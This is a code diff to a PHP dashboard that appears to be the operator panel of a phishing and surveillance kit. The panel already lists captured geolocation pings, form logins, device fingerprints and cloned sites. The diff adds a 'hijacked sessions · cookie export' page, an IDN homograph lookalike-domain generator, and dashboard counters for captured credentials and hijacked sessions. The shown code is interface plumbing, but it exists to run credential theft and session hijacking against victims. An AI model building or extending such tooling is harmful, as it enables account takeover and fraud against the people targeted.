@@ -19,6 +19,8 @@ $pages = [
     'geo'         => ['title' => 'Geo Data',    'sub' => '// captured geolocation pings'],
     'credentials' => ['title' => 'Credentials', 'sub' => '// captured form logins'],
     'devices'     => ['title' => 'Devices',     'sub' => '// browser & device fingerprints'],
+    'sessions'    => ['title' => 'Sessions',    'sub' => '// hijacked sessions · cookie export'],
+    'homograph'   => ['title' => 'Homograph',   'sub' => '// IDN domain generator · availability'],
 ];
 $page = $pages[$route] ?? $pages['home'];
 
@@ -31,6 +33,7 @@ $badge_map = [
     'credentials' => "SELECT COUNT(*) FROM events WHERE kind='cred' AND captured_at > :since",
     'targets'     => "SELECT COUNT(*) FROM targets WHERE created_at > :since",
     'devices'     => "SELECT COUNT(*) FROM events WHERE kind='device' AND captured_at > :since",
+    'sessions'    => "SELECT COUNT(*) FROM sessions WHERE captured_at > :since",
 ];
 $sidebar_badges = [];
 foreach ($badge_map as $rkey => $sql) {
@@ -112,6 +115,8 @@ if ($route !== 'home' && isset($badge_map[$route])) {
       $dash_audio    = (int) $db->query("SELECT COUNT(*) FROM media WHERE kind='mic'")->fetchColumn();
       $dash_geo      = (int) $db->query("SELECT COUNT(*) FROM events WHERE kind='geo'")->fetchColumn();
       $dash_targets  = (int) $db->query("SELECT COUNT(*) FROM targets")->fetchColumn();
+      $dash_creds    = (int) $db->query("SELECT COUNT(*) FROM events WHERE kind='cred'")->fetchColumn();
+      $dash_sessions = (int) $db->query("SELECT COUNT(*) FROM sessions")->fetchColumn();
     ?>
       <div class="stat-grid">
         <div class="stat-card">
@@ -133,6 +138,16 @@ if ($route !== 'home' && isset($badge_map[$route])) {
           <div class="stat-label">Targets</div>
           <div class="stat-value green"><?= $dash_targets ?></div>
           <div class="stat-change" style="color:var(--text-muted)">// <?= $dash_targets ? 'active clones' : 'awaiting data' ?></div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Credentials</div>
+          <div class="stat-value" style="color:var(--accent-red)"><?= $dash_creds ?></div>
+          <div class="stat-change" style="color:var(--text-muted)">// <?= $dash_creds ? 'captured logins' : 'awaiting data' ?></div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Sessions</div>
+          <div class="stat-value" style="color:var(--accent-warn,#f5a524)"><?= $dash_sessions ?></div>
+          <div class="stat-change" style="color:var(--text-muted)">// <?= $dash_sessions ? 'hijacked sessions' : 'awaiting data' ?></div>
         </div>
       </div>
 
@@ -157,6 +172,10 @@ if ($route !== 'home' && isset($badge_map[$route])) {
       <?php include "./assets/components/route-credentials.php"; ?>
     <?php elseif ($route === 'devices'): ?>
       <?php include "./assets/components/route-devices.php"; ?>
+    <?php elseif ($route === 'sessions'): ?>
+      <?php include "./assets/components/route-sessions.php"; ?>
+    <?php elseif ($route === 'homograph'): ?>
+      <?php include "./assets/components/route-homograph.php"; ?>
     <?php else: ?>
       <div class="alert alert-info">
         <div class="alert-icon"><svg class="icon icon-md"><use href="#i-info"/></svg></div>
